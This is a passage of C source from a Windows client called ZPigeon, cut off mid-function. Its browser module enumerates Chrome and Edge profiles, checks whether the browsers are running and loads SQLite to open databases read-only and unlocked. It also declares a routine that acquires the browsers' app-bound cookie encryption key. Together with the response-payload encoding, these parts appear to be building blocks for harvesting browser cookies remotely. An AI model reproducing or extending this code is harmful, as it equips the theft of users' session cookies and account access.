#include "Client.h"

#include "../../KNSoft.ZPigeon.Client.SDK/Core/Snapshot.h"

#include <KNSoft/MakeLifeEasier/MakeLifeEasier.h>
#include <bcrypt.h>
#include <dpapi.h>
#include <winsqlite/winsqlite3.h>
#include <strsafe.h>

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Version.lib")

typedef int (SQLITE_API *ZP_SQLITE_OPEN_V2)(const char*, sqlite3**, int, const char*);
typedef int (SQLITE_API *ZP_SQLITE_CLOSE)(sqlite3*);
typedef int (SQLITE_API *ZP_SQLITE_BUSY_TIMEOUT)(sqlite3*, int);
typedef int (SQLITE_API *ZP_SQLITE_PREPARE_V2)(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
typedef int (SQLITE_API *ZP_SQLITE_STEP)(sqlite3_stmt*);
typedef int (SQLITE_API *ZP_SQLITE_FINALIZE)(sqlite3_stmt*);
typedef int (SQLITE_API *ZP_SQLITE_BIND_INT)(sqlite3_stmt*, int, int);
typedef int (SQLITE_API *ZP_SQLITE_BIND_INT64)(sqlite3_stmt*, int, sqlite3_int64);
typedef
int
(SQLITE_API *ZP_SQLITE_DESERIALIZE)(
    sqlite3*,
    const char*,
    unsigned char*,
    sqlite3_int64,
    sqlite3_int64,
    unsigned);
typedef int (SQLITE_API *ZP_SQLITE_COLUMN_INT)(sqlite3_stmt*, int);
typedef sqlite3_int64 (SQLITE_API *ZP_SQLITE_COLUMN_INT64)(sqlite3_stmt*, int);
typedef const void* (SQLITE_API *ZP_SQLITE_COLUMN_TEXT16)(sqlite3_stmt*, int);
typedef int (SQLITE_API *ZP_SQLITE_COLUMN_BYTES16)(sqlite3_stmt*, int);
typedef const void* (SQLITE_API *ZP_SQLITE_COLUMN_BLOB)(sqlite3_stmt*, int);
typedef int (SQLITE_API *ZP_SQLITE_COLUMN_BYTES)(sqlite3_stmt*, int);

typedef struct _ZP_SQLITE
{
    HMODULE Module;
    ZP_SQLITE_OPEN_V2 OpenV2;
    ZP_SQLITE_CLOSE Close;
    ZP_SQLITE_BUSY_TIMEOUT BusyTimeout;
    ZP_SQLITE_PREPARE_V2 PrepareV2;
    ZP_SQLITE_STEP Step;
    ZP_SQLITE_FINALIZE Finalize;
    ZP_SQLITE_BIND_INT BindInt;
    ZP_SQLITE_BIND_INT64 BindInt64;
    ZP_SQLITE_DESERIALIZE Deserialize;
    ZP_SQLITE_COLUMN_INT ColumnInt;
    ZP_SQLITE_COLUMN_INT64 ColumnInt64;
    ZP_SQLITE_COLUMN_TEXT16 ColumnText16;
    ZP_SQLITE_COLUMN_BYTES16 ColumnBytes16;
    ZP_SQLITE_COLUMN_BLOB ColumnBlob;
    ZP_SQLITE_COLUMN_BYTES ColumnBytes;
} ZP_SQLITE, *PZP_SQLITE;

typedef struct _ZP_BROWSER_COOKIE_KEY
{
    BYTE Data[32];
    ULONG Length;
    BYTE V20Data[32];
    ULONG V20Length;
    BOOLEAN V20Attempted;
} ZP_BROWSER_COOKIE_KEY, *PZP_BROWSER_COOKIE_KEY;

typedef const ZP_BROWSER_COOKIE_KEY* PCZP_BROWSER_COOKIE_KEY;

/* AbeKey.c */
#define ZP_ABE_EDGE   0
#define ZP_ABE_CHROME 1

NTSTATUS
ZpAbeAcquireCookieKey(
    _In_ DWORD Browser,
    _Out_writes_bytes_(32) PBYTE Key,
    _Out_opt_ PULONG ResultCode);

typedef struct _ZP_BROWSER_BUILDER
{
    PBYTE Buffer;
    ULONG Length;
    ULONG Count;
    ULONG Capacity;
    ULONGLONG LastId;
} ZP_BROWSER_BUILDER, *PZP_BROWSER_BUILDER;

static
NTSTATUS
ZpBrowser_ReserveBuilder(
    _Inout_ PZP_BROWSER_BUILDER Builder,
    _In_ ULONG AdditionalLength)
{
    PBYTE Buffer;
    ULONG Capacity, RequiredLength;

    if (AdditionalLength > ZP_RESPONSE_MAX_PAYLOAD_SIZE - Builder->Length) return STATUS_BUFFER_OVERFLOW;
    RequiredLength = Builder->Length + AdditionalLength;
    if (RequiredLength <= Builder->Capacity) return STATUS_SUCCESS;
    Capacity = Builder->Capacity == 0 ? 1024 : Builder->Capacity;
    while (Capacity < RequiredLength) Capacity = min(Capacity * 2, ZP_RESPONSE_MAX_PAYLOAD_SIZE);
    Buffer = Mem_ReAlloc(Builder->Buffer, Capacity);
    if (Buffer == NULL) return STATUS_NO_MEMORY;
    Builder->Buffer = Buffer;
    Builder->Capacity = Capacity;
    return STATUS_SUCCESS;
}

static
NTSTATUS
ZpBrowser_AddRecord(
    _Inout_ PZP_BROWSER_BUILDER Builder,
    _In_ ZP_BROWSER_KIND Kind,
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ ULONGLONG Id,
    _In_opt_ PCZP_BROWSER_RECORD_DATA Data,
    _In_ PCWSTR Identity,
    _In_opt_ PCWSTR Name,
    _In_opt_ PCWSTR Location,
    _In_opt_ PCWSTR Detail)
{
    ZP_BROWSER_RECORD Record;
    ULONG RecordLength;
    NTSTATUS Status;

    if (Builder->Count == ZP_CODEC_MAX_ELEMENT_COUNT)
    {
        return STATUS_QUOTA_EXCEEDED;
    }
    Record.Kind = Kind;
    Record.Browser = Browser;
    Record.Id = Id;
    if (Data != NULL) Record.Data = *Data;
    Record.Identity = Identity;
    Record.IdentityLength = (ULONG)wcslen(Identity);
    Record.Name = Name;
    Record.NameLength = Name == NULL ? 0 : (ULONG)wcslen(Name);
    Record.Location = Location;
    Record.LocationLength = Location == NULL ? 0 : (ULONG)wcslen(Location);
    Record.Detail = Detail;
    Record.DetailLength = Detail == NULL ? 0 : (ULONG)wcslen(Detail);
    Status = ZpBrowser_EncodeRecord(&Record, NULL, 0, &RecordLength);
    if (!NT_SUCCESS(Status)) return Status;
    if (Builder->Length == 0) Builder->Length = sizeof(ULONGLONG) + sizeof(ULONG);
    Status = ZpBrowser_ReserveBuilder(Builder, RecordLength);
    if (!NT_SUCCESS(Status)) return Status;
    Status = ZpBrowser_EncodeRecord(&Record,
                                    Builder->Buffer + Builder->Length,
                                    Builder->Capacity - Builder->Length,
                                    &RecordLength);
    if (NT_SUCCESS(Status))
    {
        Builder->Length += RecordLength;
        Builder->Count++;
        Builder->LastId = Id;
    }
    return Status;
}

static
VOID
ZpBrowser_FreeBuilder(
    _Inout_ PZP_BROWSER_BUILDER Builder)
{
    Mem_Free(Builder->Buffer);
}

static
NTSTATUS
ZpBrowser_EncodeBuilder(
    _In_ PZP_BROWSER_BUILDER Builder,
    _In_ ULONGLONG NextCursor,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    NTSTATUS Status;

    if (Builder->Length == 0)
    {
        Status = ZpBrowser_ReserveBuilder(Builder, sizeof(ULONGLONG) + sizeof(ULONG));
        if (!NT_SUCCESS(Status)) return Status;
        Builder->Length = sizeof(ULONGLONG) + sizeof(ULONG);
    }
    Status = ZpBrowser_EncodePageHeader(NextCursor, Builder->Count, Builder->Buffer);
    if (!NT_SUCCESS(Status)) return Status;
    *Response = Builder->Buffer;
    *ResponseLength = Builder->Length;
    Builder->Buffer = NULL;
    return STATUS_SUCCESS;
}

static
LOGICAL
ZpBrowser_FileExists(
    _In_ PCWSTR Path)
{
    ULONG Attributes = GetFileAttributesW(Path);

    return Attributes != INVALID_FILE_ATTRIBUTES && !(Attributes & FILE_ATTRIBUTE_DIRECTORY);
}

static
NTSTATUS
ZpBrowser_GetEnvironment(
    _In_ PCWSTR Name,
    _Out_writes_(Capacity) PWSTR Value,
    _In_ ULONG Capacity)
{
    UNICODE_STRING NameString, ValueString;

    RtlInitUnicodeString(&NameString, Name);
    RtlInitEmptyUnicodeString(&ValueString, Value, (USHORT)min(Capacity * sizeof(WCHAR), MAXUSHORT));
    return RtlQueryEnvironmentVariable_U(NULL, &NameString, &ValueString);
}

static
NTSTATUS
ZpBrowser_GetPaths(
    _In_ ZP_BROWSER_TYPE Browser,
    _Out_writes_(MAX_PATH) PWSTR Executable,
    _Out_writes_(MAX_PATH) PWSTR UserData)
{
    WCHAR LocalAppData[MAX_PATH], ProgramFiles[MAX_PATH], ProgramFilesX86[MAX_PATH];
    PCWSTR Name;
    NTSTATUS Status, ProgramFilesStatus, ProgramFilesX86Status;

    Status = ZpBrowser_GetEnvironment(L"LOCALAPPDATA", LocalAppData, ARRAYSIZE(LocalAppData));
    if (!NT_SUCCESS(Status)) return Status;
    ProgramFilesStatus = ZpBrowser_GetEnvironment(L"ProgramFiles", ProgramFiles, ARRAYSIZE(ProgramFiles));
    ProgramFilesX86Status = ZpBrowser_GetEnvironment(
        L"ProgramFiles(x86)",
        ProgramFilesX86,
        ARRAYSIZE(ProgramFilesX86));
    Name = Browser == ZpBrowserChrome ? L"Google\\Chrome" : L"Microsoft\\Edge";
    Status = StringCchPrintfW(UserData, MAX_PATH, L"%s\\%s\\User Data", LocalAppData, Name);
    if (!NT_SUCCESS(Status)) return Status;
    Status = StringCchPrintfW(Executable,
                              MAX_PATH,
                              L"%s\\%s\\Application\\%s",
                              LocalAppData,
                              Name,
                              Browser == ZpBrowserChrome ? L"chrome.exe" : L"msedge.exe");
    if (SUCCEEDED(Status) && ZpBrowser_FileExists(Executable)) return STATUS_SUCCESS;
    if (NT_SUCCESS(ProgramFilesStatus))
    {
        Status = StringCchPrintfW(Executable,
                                  MAX_PATH,
                                  L"%s\\%s\\Application\\%s",
                                  ProgramFiles,
                                  Name,
                                  Browser == ZpBrowserChrome ? L"chrome.exe" : L"msedge.exe");
        if (SUCCEEDED(Status) && ZpBrowser_FileExists(Executable)) return STATUS_SUCCESS;
    }
    if (NT_SUCCESS(ProgramFilesX86Status))
    {
        Status = StringCchPrintfW(Executable,
                                  MAX_PATH,
                                  L"%s\\%s\\Application\\%s",
                                  ProgramFilesX86,
                                  Name,
                                  Browser == ZpBrowserChrome ? L"chrome.exe" : L"msedge.exe");
        if (SUCCEEDED(Status) && ZpBrowser_FileExists(Executable)) return STATUS_SUCCESS;
    }
    return STATUS_NOT_FOUND;
}

static
_Success_(NT_SUCCESS(return))
NTSTATUS
ZpBrowser_GetVersion(
    _In_ PCWSTR Path,
    _Out_writes_(VersionCapacity) PWSTR Version,
    _In_ ULONG VersionCapacity)
{
    VS_FIXEDFILEINFO* Info;
    PBYTE Buffer;
    UINT InfoLength;
    DWORD Handle, Size = GetFileVersionInfoSizeW(Path, &Handle);
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if (Size == 0) return NTSTATUS_FROM_WIN32(GetLastError());
    Buffer = Mem_Alloc(Size);
    if (Buffer == NULL) return STATUS_NO_MEMORY;
    if (GetFileVersionInfoW(Path, 0, Size, Buffer) &&
        VerQueryValueW(Buffer, L"\\", (PVOID*)&Info, &InfoLength) &&
        InfoLength >= sizeof(*Info))
    {
        Status = StringCchPrintfW(Version,
                                  VersionCapacity,
                                  L"%hu.%hu.%hu.%hu",
                                  HIWORD(Info->dwFileVersionMS),
                                  LOWORD(Info->dwFileVersionMS),
                                  HIWORD(Info->dwFileVersionLS),
                                  LOWORD(Info->dwFileVersionLS));
    }
    Mem_Free(Buffer);
    return Status;
}

static
ZP_STATUS
ZpBrowser_EnumerateProfiles(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCWSTR UserData,
    _Inout_ PZP_BROWSER_BUILDER Builder)
{
    WIN32_FIND_DATAW Data;
    WCHAR Pattern[MAX_PATH], Preferences[MAX_PATH], Location[MAX_PATH];
    HANDLE Find;
    NTSTATUS Status;

    Status = StringCchPrintfW(Pattern, ARRAYSIZE(Pattern), L"%s\\*", UserData);
    if (!NT_SUCCESS(Status)) return ZpStatus_FromNtStatus(Status);
    Find = FindFirstFileExW(Pattern, FindExInfoBasic, &Data, FindExSearchLimitToDirectories, NULL, 0);
    if (Find == INVALID_HANDLE_VALUE)
    {
        ULONG Error = GetLastError();

        return Error == ERROR_FILE_NOT_FOUND || Error == ERROR_PATH_NOT_FOUND ?
                   ZpStatus_Make(ZpStatusNone, 0) :
                   ZpStatus_FromCode(ZpStatusWin32, Error);
    }
    Status = STATUS_SUCCESS;
    do
    {
        if (!(Data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ||
            (Data.cFileName[0] == L'.' &&
             (Data.cFileName[1] == UNICODE_NULL ||
              (Data.cFileName[1] == L'.' && Data.cFileName[2] == UNICODE_NULL))))
        {
            continue;
        }
        if (FAILED(StringCchPrintfW(Preferences,
                                     ARRAYSIZE(Preferences),
                                     L"%s\\%s\\Preferences",
                                     UserData,
                                     Data.cFileName)) ||
            !ZpBrowser_FileExists(Preferences) ||
            FAILED(StringCchPrintfW(Location,
                                     ARRAYSIZE(Location),
                                     L"%s\\%s",
                                     UserData,
                                     Data.cFileName)))
        {
            continue;
        }
        Status = ZpBrowser_AddRecord(Builder,
                                     ZpBrowserKindProfile,
                                     Browser,
                                     0,
                                     NULL,
                                     Data.cFileName,
                                     NULL,
                                     Location,
                                     NULL);
    } while (NT_SUCCESS(Status) && FindNextFileW(Find, &Data));
    FindClose(Find);
    return ZpStatus_FromNtStatus(Status);
}

static
ZP_STATUS
ZpBrowser_Enumerate(
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_BUILDER Builder = { 0 };
    WCHAR Executable[MAX_PATH], UserData[MAX_PATH], Version[64];
    ZP_BROWSER_TYPE Browser;
    NTSTATUS NtStatus = STATUS_SUCCESS;
    ZP_STATUS Status = ZpStatus_Make(ZpStatusNone, 0);

    for (Browser = ZpBrowserChrome; ZpStatus_IsSuccess(Status) && Browser <= ZpBrowserEdge; Browser++)
    {
        NtStatus = ZpBrowser_GetPaths(Browser, Executable, UserData);
        if (NtStatus == STATUS_NOT_FOUND)
        {
            continue;
        }
        if (!NT_SUCCESS(NtStatus))
        {
            Status = ZpStatus_FromNtStatus(NtStatus);
            break;
        }
        if (!NT_SUCCESS(ZpBrowser_GetVersion(Executable, Version, ARRAYSIZE(Version)))) Version[0] = UNICODE_NULL;
        NtStatus = ZpBrowser_AddRecord(&Builder,
                                       ZpBrowserKindBrowser,
                                       Browser,
                                       0,
                                       NULL,
                                       L"",
                                       NULL,
                                       Executable,
                                       Version);
        Status = ZpStatus_FromNtStatus(NtStatus);
        if (ZpStatus_IsSuccess(Status)) Status = ZpBrowser_EnumerateProfiles(Browser, UserData, &Builder);
    }
    if (ZpStatus_IsSuccess(Status))
    {
        Status = ZpStatus_FromNtStatus(ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength));
    }
    ZpBrowser_FreeBuilder(&Builder);
    return Status;
}

static
LOGICAL
ZpBrowser_IsProfileValid(
    _In_ PCZP_STRING_VIEW Profile)
{
    ULONG Index;

    if (Profile->Length == 0 || Profile->Length >= MAX_PATH ||
        (Profile->Length == 1 && Profile->Buffer[0] == L'.') ||
        (Profile->Length == 2 && Profile->Buffer[0] == L'.' && Profile->Buffer[1] == L'.'))
    {
        return FALSE;
    }
    for (Index = 0; Index < Profile->Length; Index++)
    {
        if (Profile->Buffer[Index] == L'\\' || Profile->Buffer[Index] == L'/' ||
            Profile->Buffer[Index] == L':')
        {
            return FALSE;
        }
    }
    return TRUE;
}

static
NTSTATUS
ZpBrowser_CopyProfile(
    _In_ PCZP_STRING_VIEW Profile,
    _Out_writes_(MAX_PATH) PWSTR Value)
{
    if (!ZpBrowser_IsProfileValid(Profile)) return STATUS_INVALID_PARAMETER;
    RtlCopyMemory(Value, Profile->Buffer, (SIZE_T)Profile->Length * sizeof(WCHAR));
    Value[Profile->Length] = UNICODE_NULL;
    return STATUS_SUCCESS;
}

static
LOGICAL
ZpBrowser_IsDotDirectory(
    _In_ PFILE_DIRECTORY_INFORMATION Information)
{
    return (Information->FileNameLength == sizeof(WCHAR) && Information->FileName[0] == L'.') ||
           (Information->FileNameLength == 2 * sizeof(WCHAR) &&
            Information->FileName[0] == L'.' && Information->FileName[1] == L'.');
}

static
NTSTATUS
ZpBrowser_QueryDirectorySize(
    _In_ HANDLE Directory,
    _Out_ PULONGLONG Size)
{
    FILE_FIND Find;
    PFILE_DIRECTORY_INFORMATION Information;
    OBJECT_ATTRIBUTES Object;
    IO_STATUS_BLOCK IoStatus;
    UNICODE_STRING Name;
    HANDLE Child;
    ULONGLONG ChildSize, Total = 0;
    NTSTATUS Status;

    Status = IO_BeginFindFile(&Find, Directory, NULL, FileDirectoryInformation);
    if (!NT_SUCCESS(Status)) return Status;
    while (NT_SUCCESS(Status) && Find.HasData)
    {
        Information = Find.Buffer;
        for (;;)
        {
            if (!ZpBrowser_IsDotDirectory(Information))
            {
                if (Information->FileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                {
                    if (!(Information->FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT))
                    {
                        if (Information->FileNameLength > MAXUSHORT)
                        {
                            Status = STATUS_NAME_TOO_LONG;
                            break;
                        }
                        Name.Buffer = Information->FileName;
                        Name.Length = (USHORT)Information->FileNameLength;
                        Name.MaximumLength = Name.Length;
                        InitializeObjectAttributes(&Object,
                                                   &Name,
                                                   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                                                   Directory,
                                                   NULL);
                        Status = NtOpenFile(&Child,
                                            FILE_LIST_DIRECTORY | SYNCHRONIZE,
                                            &Object,
                                            &IoStatus,
                                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT |
                                                FILE_OPEN_REPARSE_POINT);
                        if (!NT_SUCCESS(Status)) break;
                        Status = ZpBrowser_QueryDirectorySize(Child, &ChildSize);
                        NtClose(Child);
                        if (!NT_SUCCESS(Status)) break;
                        if (ChildSize > MAXULONGLONG - Total)
                        {
                            Status = STATUS_INTEGER_OVERFLOW;
                            break;
                        }
                        Total += ChildSize;
                    }
                }
                else
                {
                    if (Information->EndOfFile.QuadPart < 0 ||
                        (ULONGLONG)Information->EndOfFile.QuadPart > MAXULONGLONG - Total)
                    {
                        Status = STATUS_INTEGER_OVERFLOW;
                        break;
                    }
                    Total += Information->EndOfFile.QuadPart;
                }
            }
            if (Information->NextEntryOffset == 0) break;
            Information = Add2Ptr(Information, Information->NextEntryOffset);
        }
        if (NT_SUCCESS(Status)) Status = IO_ContinueFindFileFind(&Find);
    }
    IO_EndFindFile(&Find);
    if (NT_SUCCESS(Status)) *Size = Total;
    return Status;
}

static
NTSTATUS
ZpBrowser_QueryAvailableSpace(
    _In_ HANDLE File,
    _Out_ PULONGLONG AvailableSpace)
{
    FILE_FS_SIZE_INFORMATION Information;
    IO_STATUS_BLOCK IoStatus;
    ULONGLONG AllocationUnitSize;
    NTSTATUS Status;

    Status = NtQueryVolumeInformationFile(File,
                                          &IoStatus,
                                          &Information,
                                          sizeof(Information),
                                          FileFsSizeInformation);
    if (!NT_SUCCESS(Status)) return Status;
    if (Information.AvailableAllocationUnits.QuadPart < 0) return STATUS_DATA_ERROR;
    AllocationUnitSize = (ULONGLONG)Information.SectorsPerAllocationUnit * Information.BytesPerSector;
    if (AllocationUnitSize == 0) return STATUS_DATA_ERROR;
    if ((ULONGLONG)Information.AvailableAllocationUnits.QuadPart > MAXULONGLONG / AllocationUnitSize)
    {
        return STATUS_INTEGER_OVERFLOW;
    }
    *AvailableSpace = (ULONGLONG)Information.AvailableAllocationUnits.QuadPart * AllocationUnitSize;
    return STATUS_SUCCESS;
}

static
NTSTATUS
ZpBrowser_QueryRunning(
    _In_ ZP_BROWSER_TYPE Browser,
    _Out_ PBOOLEAN Running)
{
    PSYSTEM_PROCESS_INFORMATION Processes, Process;
    UNICODE_STRING ImageName;
    BOOLEAN Found = FALSE;
    NTSTATUS Status;

    Status = Sys_QueryDynamicInfo(SystemProcessInformation, (PVOID*)&Processes);
    if (!NT_SUCCESS(Status)) return Status;
    RtlInitUnicodeString(&ImageName, Browser == ZpBrowserChrome ? L"chrome.exe" : L"msedge.exe");
    Process = Processes;
    for (;;)
    {
        if (RtlEqualUnicodeString(&Process->ImageName, &ImageName, TRUE))
        {
            Found = TRUE;
            break;
        }
        if (Process->NextEntryOffset == 0) break;
        Process = Add2Ptr(Process, Process->NextEntryOffset);
    }
    Sys_FreeInfo(Processes);
    *Running = Found;
    return STATUS_SUCCESS;
}

static
ZP_STATUS
ZpBrowser_InspectProfile(
    _In_ ZP_BROWSER_TYPE Browser,
    _In_ PCZP_STRING_VIEW Profile,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_PROFILE_INSPECTION Inspection;
    FILE_NETWORK_OPEN_INFORMATION LocalStateInformation;
    OBJECT_ATTRIBUTES Object;
    UNICODE_STRING NativePath;
    WCHAR Executable[MAX_PATH], UserData[MAX_PATH], ProfileName[MAX_PATH], Path[MAX_PATH];
    IO_STATUS_BLOCK IoStatus;
    HANDLE Directory;
    ULONG Length;
    NTSTATUS Status;

    Status = ZpBrowser_CopyProfile(Profile, ProfileName);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_GetPaths(Browser, Executable, UserData);
    if (NT_SUCCESS(Status))
    {
        Status = StringCchPrintfW(Path, ARRAYSIZE(Path), L"%s\\%s", UserData, ProfileName);
    }
    if (NT_SUCCESS(Status)) Status = NT_Win32PathToNtPath(Path, NULL, &NativePath);
    if (!NT_SUCCESS(Status)) return ZpStatus_FromNtStatus(Status);
    InitializeObjectAttributes(&Object, &NativePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    Status = NtOpenFile(&Directory,
                        FILE_LIST_DIRECTORY | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                        &Object,
                        &IoStatus,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_REPARSE_POINT);
    NT_FreeNtPath(&NativePath);
    if (!NT_SUCCESS(Status)) return ZpStatus_FromNtStatus(Status);
    Status = ZpBrowser_QueryDirectorySize(Directory, &Inspection.ProfileSize);
    NtClose(Directory);
    if (NT_SUCCESS(Status))
    {
        Status = ZpBrowser_GetEnvironment(L"LOCALAPPDATA", Path, ARRAYSIZE(Path));
    }
    if (NT_SUCCESS(Status)) Status = NT_Win32PathToNtPath(Path, NULL, &NativePath);
    if (NT_SUCCESS(Status))
    {
        Status = IO_OpenDirectory(&Directory,
                                  &NativePath,
                                  FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
        NT_FreeNtPath(&NativePath);
    }
    if (NT_SUCCESS(Status))
    {
        Status = ZpBrowser_QueryAvailableSpace(Directory, &Inspection.AvailableSpace);
        NtClose(Directory);
    }
    if (NT_SUCCESS(Status)) Status = StringCchPrintfW(Path, ARRAYSIZE(Path), L"%s\\Local State", UserData);
    if (NT_SUCCESS(Status)) Status = IO_GetWin32FileAttributes(Path, NULL, &LocalStateInformation);
    if (Status == STATUS_OBJECT_NAME_NOT_FOUND || Status == STATUS_OBJECT_PATH_NOT_FOUND ||
        Status == STATUS_NO_SUCH_FILE)
    {
        Status = STATUS_SUCCESS;
    }
    else if (NT_SUCCESS(Status))
    {
        if (LocalStateInformation.EndOfFile.QuadPart < 0 ||
            (ULONGLONG)LocalStateInformation.EndOfFile.QuadPart > MAXULONGLONG - Inspection.ProfileSize)
        {
            Status = STATUS_INTEGER_OVERFLOW;
        }
        else
        {
            Inspection.ProfileSize += LocalStateInformation.EndOfFile.QuadPart;
        }
    }
    if (NT_SUCCESS(Status)) Status = ZpBrowser_QueryRunning(Browser, &Inspection.BrowserRunning);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_EncodeProfileInspection(&Inspection, NULL, 0, &Length);
    if (NT_SUCCESS(Status))
    {
        *Response = Mem_Alloc(Length);
        if (*Response == NULL) Status = STATUS_NO_MEMORY;
    }
    if (NT_SUCCESS(Status))
    {
        Status = ZpBrowser_EncodeProfileInspection(&Inspection, *Response, Length, ResponseLength);
    }
    return ZpStatus_FromNtStatus(Status);
}

static
ZP_STATUS
ZpBrowser_LoadSqlite(
    _Out_ PZP_SQLITE Api)
{
#define ZP_BROWSER_LOAD_SQLITE(Field, Name) \
    Api->Field = (PVOID)GetProcAddress(Api->Module, Name); \
    if (Api->Field == NULL) goto MissingExport
    Api->Module = LoadLibraryExW(L"winsqlite3.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    if (Api->Module == NULL) return ZpStatus_FromCode(ZpStatusWin32, GetLastError());
    ZP_BROWSER_LOAD_SQLITE(OpenV2, "sqlite3_open_v2");
    ZP_BROWSER_LOAD_SQLITE(Close, "sqlite3_close");
    Api->BusyTimeout = (PVOID)GetProcAddress(Api->Module, "sqlite3_busy_timeout");
    ZP_BROWSER_LOAD_SQLITE(PrepareV2, "sqlite3_prepare_v2");
    ZP_BROWSER_LOAD_SQLITE(Step, "sqlite3_step");
    ZP_BROWSER_LOAD_SQLITE(Finalize, "sqlite3_finalize");
    ZP_BROWSER_LOAD_SQLITE(BindInt, "sqlite3_bind_int");
    ZP_BROWSER_LOAD_SQLITE(BindInt64, "sqlite3_bind_int64");
    Api->Deserialize = (PVOID)GetProcAddress(Api->Module, "sqlite3_deserialize");
    ZP_BROWSER_LOAD_SQLITE(ColumnInt, "sqlite3_column_int");
    ZP_BROWSER_LOAD_SQLITE(ColumnInt64, "sqlite3_column_int64");
    ZP_BROWSER_LOAD_SQLITE(ColumnText16, "sqlite3_column_text16");
    ZP_BROWSER_LOAD_SQLITE(ColumnBytes16, "sqlite3_column_bytes16");
    ZP_BROWSER_LOAD_SQLITE(ColumnBlob, "sqlite3_column_blob");
    ZP_BROWSER_LOAD_SQLITE(ColumnBytes, "sqlite3_column_bytes");
#undef ZP_BROWSER_LOAD_SQLITE
    return ZpStatus_Make(ZpStatusNone, 0);

MissingExport:
    FreeLibrary(Api->Module);
    return ZpStatus_FromCode(ZpStatusWin32, ERROR_PROC_NOT_FOUND);
}

static
PSTR
ZpBrowser_PathToUri(
    _In_ PCWSTR Path)
{
    static const CHAR Prefix[] = "file:";
    static const CHAR Suffix[] = "?mode=ro&nolock=1";
    static const CHAR Hex[] = "0123456789ABCDEF";
    CHAR Utf8[MAX_PATH * 3];
    ULONG Bytes, Index;
    PSTR Value, Output;
    NTSTATUS Status;

    Status = RtlUnicodeToUTF8N(Utf8,
                               sizeof(Utf8),
                               &Bytes,
                               Path,
                               (ULONG)wcslen(Path) * sizeof(WCHAR));
    if (!NT_SUCCESS(Status)) return NULL;
    Value = Mem_Alloc(sizeof(Prefix) - 1 + (SIZE_T)Bytes * 3 + sizeof(Suffix));
    if (Value == NULL) return NULL;
    Output = Value;
    RtlCopyMemory(Output, Prefix, sizeof(Prefix) - 1);
    Output += sizeof(Prefix) - 1;
    for (Index = 0; Index < Bytes; Index++)
    {
        if (Utf8[Index] == '%' || Utf8[Index] == '?' || Utf8[Index] == '#')
        {
            *Output++ = '%';
            *Output++ = Hex[(UCHAR)Utf8[Index] >> 4];
            *Output++ = Hex[(UCHAR)Utf8[Index] & 0xF];
        }
        else
        {
            *Output++ = Utf8[Index] == '\\' ? '/' : Utf8[Index];
        }
    }
    RtlCopyMemory(Output, Suffix, sizeof(Suffix));
    return Value;
}

static
NTSTATUS
ZpBrowser_QueryProcessHandles(
    _In_ HANDLE Process,
    _Outptr_ PPROCESS_HANDLE_SNAPSHOT_INFORMATION* Handles)
{
    ULONG Length = 64 * 1024, Required;
    NTSTATUS Status;

    for (;;)
    {
        *Handles = Mem_Alloc(Length);
        if (*Handles == NULL) return STATUS_NO_MEMORY;
        Status = NtQueryInformationProcess(Process, ProcessHandleInformation, *Handles, Length, &Required);
        if (Status != STATUS_INFO_LENGTH_MISMATCH) break;
        Mem_Free(*Handles);
        Length = max(Length * 2, Required);
        if (Length > 16 * 1024 * 1024) return STATUS_QUOTA_EXCEEDED;
    }
    if (!NT_SUCCESS(Status)) Mem_Free(*Handles);
    return Status;
}

static
NTSTATUS
ZpBrowser_QueryDatabaseId(
    _In_ PCWSTR DatabasePath,
    _Out_ PFILE_ID_INFORMATION Id)
{
    DECLSPEC_ALIGN(8) BYTE Buffer[PAGE_SIZE];
    PFILE_ID_EXTD_DIR_INFORMATION Information = (PVOID)Buffer;
    WCHAR DirectoryPath[MAX_PATH];
    OBJECT_ATTRIBUTES Object;
    UNICODE_STRING NtPath, Search;
    IO_STATUS_BLOCK IoStatus;
    HANDLE Directory;
    PWSTR Name;
    BOOL HasData;
    NTSTATUS Status;

    Status = StringCchCopyW(DirectoryPath, ARRAYSIZE(DirectoryPath), DatabasePath);
    if (!NT_SUCCESS(Status)) return Status;
    Name = wcsrchr(DirectoryPath, L'\\');
    if (Name == NULL || Name[1] == UNICODE_NULL) return STATUS_INVALID_PARAMETER;
    RtlInitUnicodeString(&Search, Name + 1);
    *Name = UNICODE_NULL;
    Status = NT_InitWin32PathObject(&Object, DirectoryPath, NULL, &NtPath);
    if (!NT_SUCCESS(Status)) return Status;
    Status = NtOpenFile(&Directory,
                        FILE_LIST_DIRECTORY | FILE_READ_ATTRIBUTES | SYNCHRONIZE,
                        &Object,
                        &IoStatus,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    NT_FreeNtPath(&NtPath);
    if (!NT_SUCCESS(Status)) return Status;
    Status = NtQueryInformationFile(Directory, &IoStatus, Id, sizeof(*Id), FileIdInformation);
    if (NT_SUCCESS(Status))
    {
